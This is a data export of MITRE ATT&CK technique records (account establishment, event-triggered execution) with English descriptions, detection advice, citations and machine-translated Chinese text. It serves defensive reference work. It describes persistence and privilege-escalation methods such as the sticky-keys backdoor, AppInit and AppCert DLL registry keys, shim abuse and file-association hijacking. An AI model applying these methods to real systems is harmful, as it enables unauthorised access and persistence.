Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,"Network Traffic: Network Traffic Content, Persona: Social Media",False,,,,,,,,,,"(Citation: Check Point Pay2Key November 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: FireEye APT17),",建立账户/创建账户,攻击者可能会创建和培养具有可在定位期间使用的服务的帐户。攻击者可以创建可用于构建角色以进行进一步操作的帐户。角色发展包括公共信息、存在、历史和适当从属关系的发展。这种发展可以应用于社交媒体、网站或其他公开可用的信息，这些信息可以在使用该角色或身份的操作过程中被引用和审查其合法性。（引用：NEWSCASTER2014）（引用：BlackHatRobinSage）对于包含社交的操作工程，在线角色的利用可能很重要。这些角色可能是虚构的或冒充真实的人。角色可能存在于单个站点或跨多个站点（例如：Facebook、LinkedIn、Twitter、Google、GitHub、Docker Hub 等）。建立角色可能需要开发额外的文档以使其看起来真实。这可能包括填写个人资料信息、开发社交网络或合并照片。（引文：NEWSCASTER2014）（引文：BlackHatRobinSage）建立帐户还可以包括在电子邮件提供商处创建帐户，这些帐户可直接用于[钓鱼信息] (https://attack.mitre.org/techniques/T1598) 或 [网络钓鱼](https://attack.mitre.org/techniques/T1566)。（引用：Mandiant APT1）
T1585.003,Establish Accounts: Cloud Accounts,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)

Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. ",https://attack.mitre.org/techniques/T1585/003,27 May 2022,21 October 2022,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).",PRE,,True,T1585,,Francesco Bigarella,,,,,,,",",建立账户/创建账户：云账户,攻击者可能会使用云提供商创建可在定位期间使用的帐户。攻击者可以使用云帐户来推进他们的操作，包括利用云存储服务（例如 Dropbox、Microsoft OneDrive 或 AWS S3 存储桶）进行 [渗入云存储](https://attack.mitre.org/techniques/T1567/002)或到[上传工具](https://attack.mitre.org/techniques/T1608/002)s。云账户也可以用于基础设施的获取，如【虚拟专用服务器】(https://attack.mitre.org/techniques/T1583/003)s或【无服务器】(https://attack.mitre. org/techniques/T1583/007) 基础设施。建立云帐户可能允许攻击者在不管理自己的服务器的情况下开发复杂的功能。（引用：Awake Security C2 Cloud）创建[云帐户]（https://attack.mitre.org/techniques/T1585/003）也可能需要攻击者建立 [Email Accounts](https://attack.mitre.org/techniques/T1585/002) 向云提供商注册。
T1585.002,Establish Accounts: Email Accounts,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)

To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)",https://attack.mitre.org/techniques/T1585/002,01 October 2020,15 April 2021,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,,True,T1585,,,,,,,,,"(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Honeybee),(Citation: FoxIT Wocao December 2019),(Citation: KISA Operation Muzabi),(Citation: IBM ITG18 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Mandiant APT1),(Citation: Proofpoint TA453 March 2021),(Citation: DOJ Iran Indictments March 2018),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: Cylance Dust Storm),(Citation: ESET Lazarus Jun 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Google EXOTIC LILY March 2022),",建立帐户/创建账户：电子邮件帐户,攻击者可能会创建可在定位期间使用的电子邮件帐户。攻击者可以使用与电子邮件提供商创建的帐户来进一步开展他们的操作，例如利用它们进行 [Phishing for Information](https://attack.mitre.org/techniques/T1598) 或 [Phishing](https://attack. mitre.org/techniques/T1566）。（引用：Mandiant APT1）对手也可能采取措施围绕电子邮件帐户培养角色，例如通过使用[社交媒体帐户]（https://attack.mitre.org/技术/T1585/001），以增加后续行为成功的机会。创建的电子邮件帐户也可用于获取基础设施（例如：[Domains](https://attack.mitre.org/techniques/T1583/001)）。（引用：Mandiant APT1）减少物理捆绑的机会将操作返回给自己，攻击者可能会使用一次性电子邮件服务。（引用：趋势科技 R980 2016）
T1585.001,Establish Accounts: Social Media Accounts,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. 

Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1585/001,01 October 2020,16 October 2021,1.1,Resource Development,"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,"Network Traffic: Network Traffic Content, Persona: Social Media",True,T1585,,,,,,,,,"(Citation: KISA Operation Muzabi),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Volexity Ocean Lotus November 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Google TAG Lazarus Jan 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Dell Threat Group 2889),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Google EXOTIC LILY March 2022),",建立账户/创建账户：社交媒体账户,攻击者可能会创建和培养可在定位期间使用的社交媒体帐户。攻击者可以创建社交媒体帐户，这些帐户可用于构建角色以进行进一步的操作。角色发展包括公共信息、存在、历史和适当隶属关系的发展。（引用：NEWSCASTER2014）（引用：BlackHatRobinSage）对于包含社会工程的操作，在社交媒体上使用角色可能很重要。这些角色可能是虚构的或冒充真实的人。角色可能存在于单个社交媒体站点上或跨多个站点（例如：Facebook、LinkedIn、Twitter 等）。在社交媒体上建立角色可能需要开发额外的文档以使其看起来真实。这可能包括填写个人资料信息、开发社交网络或合并照片。一旦角色被开发出来，对手就可以使用它来建立与感兴趣目标的联系。这些连接可能是直接的，也可能包括尝试通过其他人进行连接。（引用：NEWSCASTER2014）（引用：BlackHatRobinSage）这些帐户可能会在对手生命周期的其他阶段被利用，例如在初始访问期间（例如：[通过服务进行鱼叉式钓鱼] （https://attack.mitre.org/techniques/T1566/003））。
T1546,Event Triggered Execution,"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)

Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)

Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",https://attack.mitre.org/techniques/T1546,22 January 2020,19 October 2022,1.2,"Persistence, Privilege Escalation","Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. 

These mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. 

Monitor for processes, API/System calls, and other common ways of manipulating these event repositories. 

Tools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  

Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. ","IaaS, Linux, Office 365, SaaS, Windows, macOS","Cloud Service: Cloud Service Modification, Command: Command Execution, File: File Creation, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation, WMI: WMI Creation, Windows Registry: Windows Registry Key Modification",False,,,,,,,,,,",",事件触发执行,攻击者可以使用基于特定事件触发执行的系统机制来建立持久性和/或提升特权。各种操作系统具有监视和订阅事件的方法，例如登录或其他用户活动，例如运行特定的应用程序/二进制文件。云环境还可以支持各种功能和服务，这些功能和服务可以监控并调用以响应特定的云事件。（引用：AWS 帐户后门）（引用：Varonis Power Automate Data Exfiltration）（引用：Microsoft DART 案例报告 001）滥用这些机制作为通过重复执行恶意代码来维持对受害者的持久访问的一种手段。在获得对受害者系统的访问权后，攻击者可以创建/修改事件触发器以指向将在事件触发器被调用时执行的恶意内容。（引用：FireEye WMI 2015）（引用：OS X 上的恶意软件持久性）（引用： amnesia 恶意软件）由于可以由具有更高权限的帐户（例如 SYSTEM 或服务帐户）代理执行，因此攻击者可能能够滥用这些触发的执行机制来提升他们的权限。
T1546.008,Event Triggered Execution: Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>",https://attack.mitre.org/techniques/T1546/008,24 January 2020,13 May 2020,1.0,"Persistence, Privilege Escalation","Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Paul Speulstra, AECOM Global Security Operations Center",Administrator,,,CAPEC-558,,SYSTEM,"(Citation: RSA Shell Crew),(Citation: aptsim),(Citation: FireEye APT29 Domain Fronting),(Citation: Mandiant No Easy Breach),(Citation: Novetta-Axiom),(Citation: FireEye APT41 Aug 2019),(Citation: Github PowerShell Empire),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP),(Citation: Beechey 2010),(Citation: Windows Commands JPCERT),(Citation: Corio 2008),(Citation: TechNet RDP NLA),(Citation: TechNet RDP Gateway)",事件触发执行：辅助功能,"攻击者可以通过执行由可访问性功能触发的恶意内容来建立持久性和/或提升特权。 Windows 包含可在用户登录之前使用组合键启动的辅助功能（例如：当用户在 Windows 登录屏幕上时）。攻击者可以修改这些程序的启动方式，以获得命令提示符或后门，而无需登录系统。两个常见的辅助功能程序是 <code>C:\Windows\System32\sethc.exe</code>，当按下 shift 键五次时启动，以及 <code>C:\Windows\System32\utilman.exe</code> , 在按下 Windows + U 组合键时启动。 sethc.exe 程序通常被称为“粘滞键”，并且已被攻击者用于通过远程桌面登录屏幕进行未经身份验证的访问。 （引用：FireEye Hikit Rootkit）根据 Windows 的版本，攻击者可能会以不同的方式利用这些功能。攻击者使用的常用方法包括替换注册表中的可访问性功能二进制文件或指向这些二进制文件的指针/引用。在较新版本的 Windows 中，替换的二进制文件需要为 x64 系统进行数字签名，二进制文件必须驻留在 <code>%systemdir%\</code> 中，并且必须受 Windows 文件或资源保护 (WFP/WRP ）。 （引用：DEFCON2016 Sticky Keys）[图像文件执行选项注入]（https://attack.mitre.org/techniques/T1546/012）调试器方法可能被发现是一种潜在的解决方法，因为它不需要相应的辅助功能要替换的二进制文件。例如，对于 Windows XP 和更高版本以及 Windows Server 2003/R2 和更高版本上的简单二进制替换，可以替换程序（例如，<code>C:\Windows\System32\utilman.exe</code>）使用“cmd.exe”（或其他提供后门访问的程序）。随后，坐在键盘上或通过[远程桌面协议]（https://attack.mitre.org/techniques/T1021/001）连接时，在登录屏幕上按适当的组合键将导致执行替换的文件具有系统权限。 （引文：Tilbury 2014）其他可访问性功能也可以以类似方式利用：（引文：DEFCON2016 粘滞键）（引文：讲述人可访问性滥用）* 屏幕键盘：<code>C:\Windows\System32\ osk.exe</code> * 放大镜：<code>C:\Windows\System32\Magnify.exe</code> * 讲述人：<code>C:\Windows\System32\Narrator.exe</code> * 显示切换器: <code>C:\Windows\System32\DisplaySwitch.exe</code> * 应用切换器: <code>C:\Windows\System32\AtBroker.exe</code>"
T1546.009,Event Triggered Execution: AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",https://attack.mitre.org/techniques/T1546/009,24 January 2020,10 November 2020,1.0,"Persistence, Privilege Escalation","Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Elastic Process Injection July 2017) 

Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,"Administrator, SYSTEM",,,,,"Administrator, SYSTEM","(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP),(Citation: Beechey 2010),(Citation: Windows Commands JPCERT),(Citation: Corio 2008)",事件触发执行：AppCert DLL,攻击者可以通过执行由加载到进程中的 AppCert DLL 触发的恶意内容来建立持久性和/或提升权限。在 <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> 下的 <code>AppCertDLLs</code> 注册表项中指定的动态链接库 (DLL) 被加载到普遍调用使用的应用程序编程接口 (API) 函数 <code>CreateProcess</code>、<code>CreateProcessAsUser</code>、<code>CreateProcessWithLoginW</code>、<code>CreateProcessWithTokenW</code> 或 <code>WinExec< /代码>。 （引用：Elastic Process Injection 2017 年 7 月）与 [Process Injection](https://attack.mitre.org/techniques/T1055) 类似，该值可被滥用以通过加载并运行恶意 DLL 来获得提升的权限在计算机上的单独进程的上下文中。恶意 AppCert DLL 还可能通过持续由 API 活动触发来提供持久性。
T1546.010,Event Triggered Execution: AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)

Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. 

The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",https://attack.mitre.org/techniques/T1546/010,24 January 2020,10 November 2020,1.0,"Persistence, Privilege Escalation","Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) 

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",Windows,"Command: Command Execution, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,Administrator,,Secure boot disabled on systems running Windows 8 and later,,,"Administrator, SYSTEM","(Citation: Trustwave Cherry Picker),(Citation: Eset Ramsay May 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: FBI FLASH APT39 September 2020),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP),(Citation: Beechey 2010),(Citation: Windows Commands JPCERT),(Citation: Corio 2008)",事件触发执行：AppInit DLL,攻击者可以通过执行由加载到进程中的 AppInit DLL 触发的恶意内容来建立持久性和/或提升权限。在注册表项 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> 或 <code>HKEY_LOCAL_MACHINE\ 的 <code>AppInit_DLLs</code> 值中指定的动态链接库 (DLL) Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> 由 user32.dll 加载到每个加载 user32.dll 的进程中。实际上，这几乎是每个程序，因为 user32.dll 是一个非常常见的库。 （引用：Elastic Process Injection 2017 年 7 月）与 Process Injection 类似，这些值可被滥用以通过导致恶意 DLL 在计算机上不同进程的上下文中加载和运行来获得提升的权限。 （引用：AppInit Registry）恶意 AppInit DLL 也可能通过持续被 API 活动触发来提供持久性。当启用安全启动时，AppInit DLL 功能在 Windows 8 和更高版本中被禁用。 （引用：AppInit 安全启动）
T1546.011,Event Triggered Execution: Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)

Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. 

A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:

* <code>%WINDIR%\AppPatch\sysmain.sdb</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

Custom databases are stored in:

* <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).

Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",https://attack.mitre.org/techniques/T1546/011,24 January 2020,10 November 2020,1.0,"Persistence, Privilege Escalation","There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):

* Shim-Process-Scanner - checks memory of every running process for any shim flags
* Shim-Detector-Lite - detects installation of custom shim databases
* Shim-Guard - monitors registry for any shim installations
* ShimScanner - forensic tool to find active shims in memory
* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)

Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.",Windows,"Command: Command Execution, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,Administrator,,,,,,"(Citation: FireEye FIN7 Shim Databases),(Citation: Trustwave Pillowmint June 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Proofpoint TA505 October 2019),",事件触发执行：应用程序填充利用,攻击者可以通过执行由应用程序填充程序触发的恶意内容来建立持久性和/或提升特权。创建 Microsoft Windows 应用程序兼容性基础结构/框架（Application Shim）是为了在操作系统代码库随时间变化时允许软件向后兼容。例如，应用程序填充功能允许开发人员将修补程序应用于为 Windows XP 创建的应用程序（无需重写代码），使其适用于 Windows 10。（引用：Elastic Process Injection 2017 年 7 月）在框架内创建填充程序充当程序（或更具体地说，导入地址表）和 Windows 操作系统之间的缓冲区。执行程序时，将引用 shim 缓存以确定程序是否需要使用 shim 数据库 (.sdb)。如果是这样，则 shim 数据库使用挂钩来根据需要重定向代码，以便与操作系统通信。当前由默认 Windows 安装程序 (sdbinst.exe) 安装的所有 shim 的列表保存在： * <code>%WINDIR%\AppPatch\sysmain.sdb</code> 和 * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code> 自定义数据库存储在： * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> 和 * <code>hklm\software \microsoft\windows nt\currentversion\appcompatflags\custom</code> 为了保证 shim 的安全，Windows 将它们设计为在用户模式下运行，因此它们无法修改内核，并且您必须具有管理员权限才能安装 shim。但是，某些填充程序可用于 [绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)（UAC 和 RedirectEXE），将 DLL 注入进程（InjectDLL），禁用数据执行保护（ DisableNX) 和结构异常处理 (DisableSEH)，并拦截内存地址 (GetProcAddress)。利用这些 shim 可能允许攻击者执行多种恶意行为，例如提升权限、安装后门、禁用 Windows Defender 等防御措施等。（引文：FireEye 应用程序 Shimming）还可以通过被受影响的程序不断调用 Shims 来建立持久性.
T1546.001,Event Triggered Execution: Change Default File Association,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code>. For example: 

* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",https://attack.mitre.org/techniques/T1546/001,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation","Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.

User file association preferences are stored under <code> [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.

Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, SYSTEM, User",,,CAPEC-556,,,"(Citation: Securelist Kimsuky Sept 2013),(Citation: GitHub SILENTTRINITY Modules July 2019),",事件触发执行：更改默认文件关联,攻击者可以通过执行由文件类型关联触发的恶意内容来建立持久性。打开文件时，会检查用于打开文件的默认程序（也称为文件关联或处理程序）。文件关联选择存储在 Windows 注册表中，可由具有注册表访问权限的用户、管理员或程序或管理员使用内置 assoc 实用程序进行编辑。（引用：Microsoft 更改默认程序）（引用：Microsoft 文件处理程序） （引用：Microsoft Assoc Oct 2017）应用程序可以修改给定文件扩展名的文件关联，以在打开具有给定扩展名的文件时调用任意程序。系统文件关联列在 <code>HKEY_CLASSES_ROOT\.[extension]</code> 下，例如 <code>HKEY_CLASSES_ROOT\.txt</code>。这些条目指向位于 <code>HKEY_CLASSES_ROOT\\[handler]</code> 的该扩展的处理程序。然后将各种命令列为 <code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code> 的 shell 键下的子键。例如：* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command </code> 列出的键值是处理程序打开文件扩展名时执行的命令。攻击者可以修改这些值以连续执行任意命令。（引用：TrendMicro TROJ-FAKEAV OCT 2012）
